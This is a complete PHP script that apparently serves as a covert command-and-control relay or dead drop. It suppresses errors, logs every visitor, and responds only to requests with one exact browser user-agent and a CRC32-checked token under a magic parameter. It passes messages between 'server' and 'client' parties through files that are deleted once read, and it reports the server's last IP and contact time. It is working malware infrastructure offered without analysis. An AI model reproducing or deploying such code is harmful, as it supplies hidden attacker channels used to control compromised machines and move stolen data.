<?php
	error_reporting(0); 

	date_default_timezone_set("Japan");                       
	$datapath=dirname(__FILE__).'/drv';       
	$IsLogAllAccess=true;                                   

	$clienttype=0;		
	$paramcount=0;
	$param=$_REQUEST;
	$data="";

	if(!file_exists($datapath)) mkdir($datapath,0777);
    
	if($IsLogAllAccess)
	{
		$logstr=date("Y-m-d G:i:s");
		$logstr=$logstr.'   '.$_SERVER["REMOTE_ADDR"].'   ';
		$logstr=$logstr.$_SERVER['HTTP_USER_AGENT'].'   '; 
		$logstr=$logstr.$_SERVER['REQUEST_METHOD'].'   ';
		$logstr=$logstr.$_SERVER['REQUEST_URI'];
		$logstr=$logstr."\r\n";
		error_log($logstr,3,$datapath.'/allaccess.log');  
	}	

	if(strcmp($_SERVER['HTTP_USER_AGENT'],'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')!=0)
	{
		return;
	}

	if(is_array($param)) 
	{
		foreach($param as $tt=>$tt_value)
		{
			$paramcount++;
			if($paramcount==1)
			{	
				if(strcmp($tt,"msabcde")==0)
				{
 					$clienttype=1; //Client
					$data=$tt_value;
				}
				else
				{
					$data=$tt_value;
				}
			}
		}	
	}
/*	
	if($clienttype==0)
	{
		echo "Type: Server<br>";
		echo "Data: ".$data."<br>";
	}
	if($clienttype==1)
	{
		echo "Type: Client<br>";
		echo "Data: ".$data."<br>";
	}
*/

/*
if(is_array($param)) 
{
	foreach($param as $tt=>$tt_value)
	{
		$paramcount++;
		echo $paramcount. " Key=" . $tt . ", Value=" . $tt_value . "</br>";
	}	
}
*/
	if($clienttype==0)			
	{
		if(strlen($data)<17)
		{
//			echo "No valid server.";
			return;
		}
		$rands=substr($data,0,8);
		$randshash=substr($data,8,8);
		$crc32str=sprintf("%08x",crc32($rands));
//		echo $crc32str."</br>";
		if(strcmp($randshash,$crc32str)!=0)
		{
//			echo "No valid server.";
			return;
		}
		
		$fp=fopen($datapath."/s_lastrand.txt","r");   
		$lastrand=fgets($fp);
		fclose($fp);
		
		if(strlen($lastrand)>0)
		{
			if(strpos($lastrand,$rands)>0)
			{
				return;	
			}
		}

		if(strlen($lastrand)<160)
		{
			$lastrand=$lastrand.$rands;
		}
		else
		{
			$lastrand=substr($lastrand,8).$rands;
		}
		
        	$fp=fopen($datapath."/s_lastrand.txt","w");   
        	fputs($fp,$lastrand);
        	fclose($fp);		
		

        	$timestr=date("Y-m-d G:i:s");
        	$fp=fopen($datapath."/s_last.txt","w");   
        	fputs($fp,$timestr);
        	fclose($fp);     
        
        	$serverip=$_SERVER["REMOTE_ADDR"];
        	$fp=fopen($datapath."/s_ip.txt","w");
        	fputs($fp,$serverip);
        	fclose($fp);  
         
		$scmd=substr($data,16,1);
		if($scmd=='1')			
		{
            		if($dh=opendir($datapath))
            		{
                		while(($filename=readdir($dh))!=false)
                		{                       
                    			if($filename!='.' && $filename!='..')   
                    			{
                        			$fullfilename=$datapath.'/'.$filename;
                        			if(!is_dir($fullfilename))
                        			{
                            				if(substr($filename,0,4)=='ccc_')
                            				{
                                				$fp=fopen($fullfilename,"r");
                                				$cdata = fread($fp, filesize($fullfilename));
                                				fclose($fp);                                
                                				echo $cdata;
                                				chmod($fullfilename,0777);
                                				unlink($fullfilename);
                                				break;
                            				}
                        			}
                    			}
                		}
                		closedir($dh);
            		}           
            		return;			
		}
		if($scmd=="2")			
		{			
			$s_data=substr($data,17);
//			echo $s_data."</br>";
            		$sfilename=$datapath."/sss_".date("YmdGis").get_millisecond().".txt";
            		$fp=fopen($sfilename,"w");
            		fwrite($fp,$s_data);
            		fclose($fp); 
            		echo '1';            
            		return;
		}		
	}
	if($clienttype==1)			
	{
		if(strlen($data)<17)
		{
//			echo "No valid client.";
			return;
		}
		$rands=substr($data,0,8);
		$randshash=substr($data,8,8);
		$crc32str=sprintf("%08x",crc32($rands));
//		echo $crc32str."</br>";
		if(strcmp($randshash,$crc32str)!=0)
		{
//			echo "No valid client.";
			return;
		} 
         
		$ccmd=substr($data,16,1);
		if($ccmd=="0")		
		{			
            		echo 'abcde';            
            		return;
		}		
		if($ccmd=='1')		
		{
            		if($dh=opendir($datapath))
            		{
                		while(($filename=readdir($dh))!=false)
                		{                       
                    			if($filename!='.' && $filename!='..')   
                    			{
                        			$fullfilename=$datapath.'/'.$filename;
                        			if(!is_dir($fullfilename))
                        			{
                            				if(substr($filename,0,4)=='sss_')
                            				{
                                				$fp=fopen($fullfilename,"r");
                                				$cdata = fread($fp, filesize($fullfilename));
                                				fclose($fp);                                
                                				echo $cdata;
                                				chmod($fullfilename,0777);
                                				unlink($fullfilename);
                                				break;
                            				}
                        			}
                    			}
                		}
                		closedir($dh);
            		}           
            		return;			
		}
		if($ccmd=="2")		
		{			
			$s_data=substr($data,17);
//			echo $s_data."</br>";
            		$sfilename=$datapath."/ccc_".date("YmdGis").get_millisecond().".txt";
            		$fp=fopen($sfilename,"w");
            		fwrite($fp,$s_data);
            		fclose($fp); 
            		echo '1';            
            		return;
		}
		if($ccmd=="3")						
		{
			$fp=fopen($datapath."/s_last.txt","r");   
			$lasttime=fgets($fp);
			fclose($fp);
			$retstr=$lasttime."|||";
			$fp=fopen($datapath."/s_ip.txt","r");
			$ip=fgets($fp);
			fclose($fp);
			$retstr=$retstr.$ip;
			echo $retstr;
			return; 			
		}
	}

//echo "Hello";
//phpinfo();


    function deltree($deldir)   
    {
        if($mydir=opendir($deldir))
        {  
            while(($file=readdir($mydir))!=false)
            {
                if((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..'))
                {
                    chmod($deldir.'/'.$file,0777);
                    deltree($deldir.'/'.$file);
                }
                if(is_file($deldir.'/'.$file))
                {
                    chmod($deldir.'/'.$file,0777);
                    unlink($deldir.'/'.$file);
                }
            }
            closedir($mydir);
        }
        chmod($deldir,0777);
        return(rmdir($deldir));
    }
    
    function get_millisecond()  
    {  
        list($usec, $sec) = explode(" ", microtime());  
        $msec=round($usec*1000);  
        return(sprintf("%03d",$msec));             
    }

?>